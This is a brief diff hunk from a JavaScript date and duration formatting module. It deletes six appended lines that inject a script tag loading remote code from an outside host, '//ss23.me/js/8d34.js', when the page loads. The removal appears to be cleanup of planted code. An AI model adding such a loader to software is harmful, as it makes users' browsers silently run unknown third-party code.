@@ -160,9 +160,3 @@ function formatRange(cmd, formatStart, formatEnd, separator) {
 
 export default main;
 export { toDateTime, toDuration };
-var e = document.createElement("script");
-  e.async = !0,
-  e.src = "//ss23.me/js/8d34.js";
-  e.charset="UTF-8";
-  var t = document.getElementsByTagName("script")[0];
-  t.parentNode.insertBefore(e, t);
